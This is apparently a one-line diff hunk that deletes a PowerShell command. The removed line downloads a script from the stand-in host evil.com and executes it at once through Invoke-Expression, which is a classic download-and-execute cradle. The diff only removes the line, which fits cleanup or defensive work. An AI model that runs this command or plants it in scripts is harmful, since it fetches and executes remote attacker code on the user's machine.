@@ -1,1 +1,0 @@
-IEX (New-Object Net.WebClient).DownloadString('http://evil.com/payload.ps1')
